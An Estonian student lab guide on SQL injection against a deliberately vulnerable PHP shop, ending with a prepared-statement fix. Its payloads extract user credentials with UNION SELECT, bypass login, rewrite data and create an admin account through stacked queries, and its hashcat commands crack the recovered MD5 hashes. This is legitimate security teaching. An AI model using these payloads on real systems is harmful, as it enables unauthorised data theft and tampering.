# Õpilase kasutusjuhend — SQL-süstimise labor

> See juhend on mõeldud **sulle, õppijale**. Järgi seda sammsammult. Iga sammu
> juures on seletatud **miks** sa seda teed, **kuidas** seda teha ja **mida** see
> täpselt teeb. Sa ei pea eelteadmisi omama — kõik mõisted seletatakse lahti.

---

## 1. Mis see labor on ja miks seda teed

### Labori eesmärk
Selle labori lõpuks sa:
1. mõistad, **mis on SQL-süstimine** (inglise keeles *SQL injection*) ja miks see
   on üks ohtlikumaid veebihaavatavusi;
2. oskad **ise leida ja ära kasutada** SQL-süstimise viga haavatavas veebilehes;
3. oskad andmebaasist **välja lugeda** andmeid (sh kasutajanimesid ja paroole),
   millele sul ei tohiks ligipääsu olla;
4. mõistad, **kuidas sama viga parandada**, ja oskad seletada, miks parandus toimib.

### Mida sa päriselt tegema hakkad
Sulle on ette antud väike veebipood (toodete nimekiri, otsing, sisselogimine). See
pood on **tahtlikult valesti programmeeritud**. Sina mängid ründaja rolli: sisestad
veebilehe aadressiribale ja vormidesse erilisi "nippe" (ingl *payload*), mis panevad
andmebaasi tegema asju, mida programmeerija ei kavatsenud. Lõpuks parandad vea ära ja
tõestad, et rünnak enam ei tööta.

### ⚠️ Väga oluline: eetika ja seadus
Kõike siin õpitut tohib kasutada **ainult selles laboris** või süsteemides, mille
omanik on sulle **kirjalikult loa** andnud. Võõra veebilehe ründamine (ka "lihtsalt
proovimiseks") on Eestis **kuritegu** (karistusseadustik). Küberturbe spetsialist
õpib ründama selleks, et osata **kaitsta** — mitte kahjustada.

---

## 2. Taustateadmised (loe see enne alustamist läbi)

### Mis on andmebaas ja SQL?
**Andmebaas** on koht, kuhu veebileht salvestab oma andmed (kasutajad, tooted,
tellimused). Meie laboris on andmebaasimootoriks **MySQL / MariaDB**.
**SQL** (*Structured Query Language* — "struktureeritud päringukeel") on keel, millega
andmebaasilt andmeid küsitakse. Näiteks päring

```sql
SELECT nimi, hind FROM tooted WHERE id = 1;
```

tähendab: "vali tabelist `tooted` nimi ja hind selle rea kohta, mille `id` on 1".

### Kuidas veebileht andmebaasiga suhtleb?
Kui sa avad brauseris aadressi `toode.php?id=1`, juhtub järgmine ahel:

1. **Brauser** saadab veebiserverile HTTP-päringu (*HTTP* = *HyperText Transfer
   Protocol*, veebi suhtlusprotokoll). `?id=1` on **parameeter** — lisainfo, mille
   brauser serverile kaasa annab.
2. **Apache** (veebiserver) annab päringu edasi **PHP**-le (*PHP: Hypertext
   Preprocessor* — programmeerimiskeel, milles pood on kirjutatud).
3. PHP-kood **ehitab SQL-päringu** ja saadab selle andmebaasile.
4. Andmebaas tagastab tulemuse, PHP vormistab sellest **HTML**-i (*HyperText Markup
   Language* — lehe keel) ja brauser näitab seda sulle.

### Kus viga tekib?
Haavatavas poes paneb PHP sinu sisestatud `id` **otse** päringusse, nii nagu see on:

```php
$id = $_GET['id'];                                  // võtab URL-ist id väärtuse
$sql = "SELECT ... FROM tooted WHERE id = $id";     // liidab selle otse stringi
```

Kui sa sisestad `id=1`, saab päringuks `... WHERE id = 1` — kõik korras. Aga kui sa
sisestad `id=1 OR 1=1`, saab päringuks `... WHERE id = 1 OR 1=1` — ja nüüd on sinu
tekst muutunud **käsu osaks**. Just see ongi SQL-süstimine: kasutaja sisend, mis
pidi olema pelgalt **andmed**, muutub **käsuks**.

### Mis on "nipp" (payload)?
*Payload* on see osa sinu sisendist, mis on mõeldud päringu tähendust muutma, nt
`OR 1=1`, `UNION SELECT ...` või `' -- `. Juhendis näed neid palju.

---

## 3. Laborikeskkonna tutvustus

Laboris on kolm masinat (virtuaalmasinat), igaühel oma roll:

| Masin | Roll | Mida sina sellega teed |
|-------|------|------------------------|
| **Ubuntu/Debian server** | Ohver | Siin töötab haavatav veebipood. Sa EI logi siia sisse — sa ründad seda üle võrgu. |
| **Kali Linux** | Ründaja (sinu tööriist) | Siit avad brauseri ja käivitad ründetööriistu (`curl`, `sqlmap`, `hashcat`). |
| **Windows Server 2019** | Taustakeskkond | Osa võrgust (kataloogiteenus jms). Selles laboris sa seda ei puuduta. |

Kõik masinad on samas **isoleeritud laborivõrgus**, millel pole ühendust päris
internetiga väljapoole — seepärast on ründamine siin ohutu ja lubatud.

**`<ip>`** tähendab kogu juhendis ohvermasina IP-aadressi (nt `192.168.50.10`).
Küsi see õpetajalt või vaata ohvermasina töölaualt. Asenda `<ip>` kõikjal selle
tegeliku aadressiga.

---

## 4. Ettevalmistus (tee need sammud enne rünnakuid)

### Samm 4.1 — Ava Kali Linux ja kontrolli ühendust
1. Logi Kali Linuxi sisse.
2. Ava brauser (Firefox) ja mine aadressile: `http://<ip>/index.php`
3. **Mida sa peaksid nägema:** veebipoe avalehte toodete nimekirjaga.
   - **Kui lehte ei tule:** kontrolli, et ohvermasin töötab ja et `<ip>` on õige.
     Kali terminalis saad ühendust testida käsuga `ping <ip>` (katkesta `Ctrl+C`).

### Samm 4.2 — Tutvu poega
1. Kliki avalehel mõnel tootel. Vaata brauseri **aadressiriba** — seal muutub aadress
   kujule `toode.php?id=1`, `toode.php?id=2` jne. **See `id` number on sinu
   sihtmärk** — just seda parameetrit hakkad "katsetama".
2. Ava ka lehed "Otsing" ja "Logi sisse", et teada, mis seal on.

### Samm 4.3 — Kaks võimalust rünnakuks: brauser või terminal
Sa võid payload'e sisestada **kahel viisil**:
- **Brauseri aadressiribal** — lihtsaim, näed tulemust kohe lehel.
- **Kali terminalis käsuga `curl`** — `curl` (*Client URL*) on tööriist, mis pärib
  veebilehte käsurealt. Kasulik, kui tahad tulemust salvestada või kopeerida.

**URL-i kodeerimine — oluline!** Veebiaadressis ei tohi olla "paljast" tühikut ega
mõnda erimärki. Brauser asendab tühiku enamasti ise. Terminalis pane kogu aadress
**ülakomadesse** ja asenda erimärgid:

| Märk | URL-is |
|------|--------|
| tühik | `%20` |
| `'` (ülakoma) | `%27` |
| `#` (trell) | `%23` |

Näide samast rünnakust mõlemal viisil:
- Brauseris: `http://<ip>/toode.php?id=1 OR 1=1`
- Terminalis: `curl "http://<ip>/toode.php?id=1%20OR%201=1"`

### Samm 4.4 — Pane tähele musta "SQL:" kasti
Iga haavatav leht kuvab all **mustas kastis tegeliku SQL-päringu**, mille sinu
sisend tekitas. **Vaata seda alati!** Nii näed täpselt, mida sa andmebaasile saatsid.
(Päris veebilehel seda kasti poleks — see on siin ainult õppimiseks.)

---

## 5. Rünnakud sammsammult

> Iga ülesanne on üles ehitatud nii: **Eesmärk → Sammud → Mida sa näed → Mida see
> tähendab → Mõtle järele.** Tee ülesanded järjekorras, sest hilisemad tuginevad
> varasematele. Tee igast õnnestunud rünnakust **ekraanipilt** — läheb aruandesse vaja.

---

### ÜLESANNE 1 — Kas leht on üldse haavatav? (luure)

**Eesmärk:** veenduda, et parameeter `id` on süstitav, enne kui tõsisemat rünnakut proovid.

**Sammud:**
1. Ava tavaline leht: `http://<ip>/toode.php?id=1` → näed üht toodet. See on "normaalne" olek.
2. Lisa aadressi lõppu **üks ülakoma**: `http://<ip>/toode.php?id=1'`
3. Vaata, mis juhtub.

**Mida sa näed:** andmebaasi **veateade**, midagi stiilis
*"You have an error in your SQL syntax..."*.

**Mida see tähendab:** sinu ülakoma lõhkus päringu süntaksi. See tõestab, et sinu
sisend jõuab **otse** päringusse — ehk leht **on haavatav**. Kui leht oleks kaitstud,
ei tuleks viga, vaid lihtsalt "toodet ei leitud".

**Miks ülakoma?** SQL-is piiritleb ülakoma teksti algust ja lõppu. Üks üleliigne
ülakoma jätab teksti "lahtiseks" → süntaksiviga. See on klassikaline esimene test.

**Mõtle järele:** miks on arendaja jaoks halb, et veateade kasutajale üldse näidatakse?

---

### ÜLESANNE 2 — Sunni leht näitama kõiki tooteid (`OR 1=1`)

**Eesmärk:** näha, kuidas tõene tingimus muudab päringu tulemust.

**Sammud:**
1. Ava: `http://<ip>/toode.php?id=1 OR 1=1`
2. Vaata musta "SQL:" kasti ja toodete arvu.

**Mida sa näed:** ühe toote asemel kuvatakse **kõik** tooted.

**Mida see tähendab:** päring muutus kujule `... WHERE id = 1 OR 1=1`. Osa `1=1` on
**alati tõene**, seega tingimus `WHERE` sobib **iga reaga** ja andmebaas tagastab
kõik. Sa muutsid programmi loogikat, ilma et oleksid koodi puutunud.

**Mõtle järele:** kui see oleks pangaülekannete tabel, mida `OR 1=1` tähendaks?

---

### ÜLESANNE 3 — Mitu veergu päring tagastab? (`ORDER BY`)

**Eesmärk:** valmistuda järgmiseks (UNION) rünnakuks — selleks pead teadma veergude arvu.

**Sammud (proovi ükshaaval):**
1. `http://<ip>/toode.php?id=1 ORDER BY 5` → leht töötab normaalselt.
2. `http://<ip>/toode.php?id=1 ORDER BY 6` → tuleb viga *Unknown column '6'*.

**Mida see tähendab:** `ORDER BY N` käsib järjestada tulemuse N-inda veeru järgi. Kui
N on suurem kui veergude arv, tuleb viga. Viga tekkis 6 juures → päring tagastab
täpselt **5 veergu** (`id, nimi, kirjeldus, hind, laos`). Jäta see arv meelde.

**Miks seda vaja on?** Järgmises ülesandes "liidame juurde" oma päringu, ja selle
veergude arv peab **täpselt klappima**, muidu andmebaas keeldub.

---

### ÜLESANNE 4 — Loe välja kasutajad ja paroolid (`UNION SELECT`)

**Eesmärk:** tootepäringu kaudu kätte saada hoopis **teise** tabeli (`kasutajad`) sisu.

**Mõiste:** `UNION` ühendab kahe `SELECT`-päringu tulemused üheks. Ründaja lisab oma
`SELECT`-i, et pärida midagi, mida leht ei kavatsenud näidata.

**Sammud:**
1. **Leia, millised veerud lehel nähtavale tulevad:**
   `http://<ip>/toode.php?id=-1 UNION SELECT 1,2,3,4,5`
   - `id=-1` ei vasta ühelegi tootele → esimene päring on **tühi**, nii näed ainult
     meie "juurde liidetud" rida.
   - Vaata, millised numbrid lehel ilmuvad (ilmuvad **2** ja **3** — toote nime ja
     kirjelduse kohale). Need on "aknad", kuhu saad andmeid panna.
2. **Pane akendesse päris andmed:**
   ```
   http://<ip>/toode.php?id=-1 UNION SELECT 1,kasutaja,parool,4,5 FROM kasutajad
   ```
   terminalis:
   ```bash
   curl "http://<ip>/toode.php?id=-1%20UNION%20SELECT%201,kasutaja,parool,4,5%20FROM%20kasutajad"
   ```

**Mida sa näed:** "toodete" asemel kuvatakse **kasutajanimed ja paroolid**, nt
`admin / SuperSalajane2019!`.

**Mida see tähendab:** sa lugesid kaitsetu lehe kaudu välja andmed, mida sa poleks
tohtinud näha. See on SQL-süstimise üks ohtlikumaid tagajärgi — **andmeleke**.

**Mõtle järele:** märkad, et osa paroole pole selge tekst, vaid pikk segane jada
(nt `827ccb0e...`). See on **räsi** — sellest on juttu järgmises ülesandes.

---

### ÜLESANNE 5 — Avasta andmebaasi ehitus (`information_schema`)

**Eesmärk:** mis siis, kui sa ei teaks, et tabel on nimega `kasutajad`? Siin õpid
andmebaasi ise "kaardistama".

**Mõiste:** `information_schema` on andmebaasi enda sisemine kataloog, mis kirjeldab
kõiki teisi tabeleid ja veerge. See on ründaja "kaart".

**Sammud:**
1. **Küsi kõik tabelinimed:**
   ```
   http://<ip>/toode.php?id=-1 UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema=database()
   ```
   (`database()` tähendab "praegune andmebaas".)
2. **Küsi tabeli `kasutajad` veerud:**
   ```
   http://<ip>/toode.php?id=-1 UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='kasutajad'
   ```

**Mida sa näed:** nimekirja tabelitest (`kasutajad`, `tooted`, `logid`) ja veergudest
(`id`, `kasutaja`, `parool`, `roll`, `email`).

**Mida see tähendab:** ründaja ei pea nimesid arvama — andmebaas ise ütleb need. Nüüd
tead täpselt, mida Ülesandes 4 pärida.

---

### ÜLESANNE 6 — Logi sisse ilma paroolita (autentimisest möödahiilimine)

**Eesmärk:** pääseda admininana sisse, teadmata ühtegi parooli.

**Sammud:**
1. Ava `http://<ip>/login.php`.
2. Sisesta:
   - **Kasutajanimi:** `admin' -- ` (pane **tühik** kriipsude järele — see on oluline!)
   - **Parool:** ükskõik mida, nt `xxx`
3. Vajuta "Logi sisse".

**Mida sa näed:** "Sisselogimine õnnestus! Tere, admin".

**Mida see tähendab — samm-sammult:** leht ehitab päringu
```sql
SELECT ... WHERE kasutaja = 'admin' -- ' AND parool = '...'
```
Märgid `--` alustavad SQL-is **kommentaari** — kõik pärast neid jäetakse tähelepanuta.
Nii "kustub" parooli kontroll ära ja alles jääb vaid `kasutaja = 'admin'`. Andmebaas
leiab admini ja leht laseb su sisse.

**Miks tühik `--` järel?** MySQL-is peab rea-kommentaari `--` järel olema tühik, muidu
seda ei loeta kommentaariks.

**Mõtle järele:** proovi ka kasutajanime `' OR '1'='1' -- `. Miks see samuti töötab?

---

### ÜLESANNE 7 — Murra väljaloetud paroolid lahti

**Eesmärk:** muuta Ülesandes 4 nähtud räsid tagasi loetavaks parooliks.

**Mõiste:** **räsi** (*hash*) on parooli "sõrmejälg" — ühesuunaline teisendus. `MD5`
(*Message-Digest algorithm 5*) on vana ja **nõrk** räsialgoritm: sama parool annab
alati sama räsi, ja levinud paroolide räsid on juba valmis tabelites olemas.

**Sammud (Kali terminalis):**
1. Salvesta üks Ülesandes 4 nähtud räsi faili:
   ```bash
   echo '827ccb0eea8a706c4c34a16891f84e7b' > hash.txt
   ```
2. Paki lahti paroolisõnastik (`rockyou` on kuulus levinud paroolide nimekiri):
   ```bash
   sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
   ```
3. Murra räsi tööriistaga `hashcat` (`-m 0` = MD5-tüüp):
   ```bash
   hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
   ```

**Mida sa näed:** `hashcat` leiab, et `827ccb0e...` vastab paroolile **`12345`**.

**Mida see tähendab:** isegi "peidetud" (räsitud) paroolid pole kaitstud, kui kasutada
nõrka algoritmi (MD5) ja nõrku paroole. Siit tuleb oluline õppetund kaitse jaoks:
kasuta tugevaid algoritme (bcrypt, argon2) ja tugevaid paroole.

---

### ÜLESANNE 8 — Muuda ja kustuta andmeid (stacked queries)

**Eesmärk:** näha, et süstimisega saab andmeid mitte ainult lugeda, vaid ka **muuta**.
**Leht:** `otsing.php` (see lubab korraga mitut käsku — nn *stacked queries*).

**Sammud:**
1. Tavaline otsing: `http://<ip>/otsing.php?q=klaviatuur` → leiab toote.
2. **Nulli kõik hinnad:**
   ```
   http://<ip>/otsing.php?q=x'; UPDATE tooted SET hind=0; -- 
   ```
3. Ava `http://<ip>/index.php` → kõigi toodete hind on nüüd **0 €**.
4. **(Valikuline) lisa endale admin-konto:**
   ```
   http://<ip>/otsing.php?q=x'; INSERT INTO kasutajad (kasutaja,parool,roll) VALUES ('mina','123','admin'); -- 
   ```

**Mida see tähendab:** märk `;` lõpetab esimese käsu ja alustab uut (`UPDATE` muudab,
`INSERT` lisab, `DELETE` kustutaks). Ründaja saab andmebaasi sisu ümber kirjutada.

**Oluline:** see töötab `otsing.php`-s, aga **mitte** `toode.php`-s. Põhjus: `toode.php`
kasutab funktsiooni, mis lubab korraga ainult **ühe** käsu, `otsing.php` aga mitut.
Jäta meelde — kaitse osas tuleme selle juurde tagasi.

---

### ÜLESANNE 9 — Paranda viga ära ja tõesta, et rünnak enam ei tööta (kaitse)

**Eesmärk:** kõige tähtsam osa — õppida viga **kinni panema**.

**Sammud:**
1. Ava võrdluseks **turvaline** versioon: `http://<ip>/toode_turvaline.php?id=1` →
   töötab tavaliselt.
2. **Proovi sama rünnakut mis Ülesandes 2 ja 4:**
   - `http://<ip>/toode_turvaline.php?id=1 OR 1=1` → kuvatakse ainult **1** toode (rünnak **nurjus**).
   - `http://<ip>/toode_turvaline.php?id=-1 UNION SELECT 1,kasutaja,parool,4,5 FROM kasutajad` → **tühi** tulemus.
3. **Ava mõlema faili kood** (`toode.php` ja `toode_turvaline.php`) ja võrdle.

**Mida sa näed koodis:** turvaline versioon kasutab **ettevalmistatud päringut**
(*prepared statement*):
```php
$id = (int) $_GET['id'];                                   // teisendab täisarvuks
$stmt = mysqli_prepare($conn, "SELECT ... WHERE id = ?");   // ? on kohatäide
mysqli_stmt_bind_param($stmt, 'i', $id);                    // seob väärtuse eraldi
```

**Mida see tähendab:** ettevalmistatud päringus saadetakse päringu **struktuur** ja
**andmed** andmebaasile **eraldi**. Sinu sisend ei saa enam kunagi päringu käsuks
muutuda — see jääb alati pelgalt andmeks. Lisaks `(int)` teisendab sisendi täisarvuks,
nii et `1 OR 1=1`-st saab lihtsalt arv `1`.

**Kolm kaitsekihti, mida see labor õpetab:**
1. **Kood:** ettevalmistatud päringud + sisendi kontroll (mitte stringide liitmine).
2. **Andmebaas:** anna rakendusele ainult hädavajalikud õigused (mitte kõike).
3. **Server:** ära näita veateateid kasutajale; kasuta tugevaid paroolirääse.

---

## 6. Kokkuvõte ja refleksioon

Vasta oma aruandes lühidalt:
1. Milline ülesanne oli sinu arvates kõige ohtlikum päris maailmas ja miks?
2. Selgita oma sõnadega, **miks** SQL-süstimine üldse tekib (üks lause).
3. Miks **ettevalmistatud päring** rünnaku peatab?
4. Nimeta kolm asja, mida arendaja oleks saanud teha, et seda viga vältida.

**Esita:** ekraanipildid vähemalt 3 õnnestunud rünnakust (koos kasutatud payload'iga),
vastused ülaltoodud küsimustele, ja kirjeldus, kuidas sa ühe vea parandasid.

---

## 7. Mõistete sõnastik

| Mõiste | Seletus |
|--------|---------|
| **SQL** (*Structured Query Language*) | Keel andmebaasi päringuteks |
| **SQLi** (*SQL injection*) | Rünnak, kus kasutaja sisend muutub SQL-käsu osaks |
| **payload** | Sisendi osa, mis muudab päringu tähendust (nt `OR 1=1`) |
| **UNION** | Kahe päringu tulemuste ühendamine; kasutatakse andmete väljalugemiseks |
| **information_schema** | Andmebaasi sisemine "kaart" (tabelite ja veergude nimekiri) |
| **prepared statement** | Ettevalmistatud päring; eraldab käsu ja andmed → peatab SQLi |
| **räsi** (*hash*) | Parooli ühesuunaline "sõrmejälg" |
| **MD5** | Vana, nõrk räsialgoritm — ei sobi paroolidele |
| **curl** (*Client URL*) | Käsurea tööriist veebilehtede pärimiseks |
| **sqlmap** | Tööriist, mis automatiseerib SQLi tuvastamise ja ärakasutamise |
| **HTTP** (*HyperText Transfer Protocol*) | Veebi suhtlusprotokoll |
| **URL** (*Uniform Resource Locator*) | Veebiaadress |
| **RCE** (*Remote Code Execution*) | Kaugkäsu täitmine — ründaja jooksutab serveris käske |

> Rohkem rünnakunäiteid ja tehnilisi üksikasju leiad failidest `PAIGALDUS.md` ja
> `LABORITOOD.md`. Edasijõudnutele on `LABORITOOD.md`-s ka Ülesanne 7 (failide lugemine
> ja webshell).
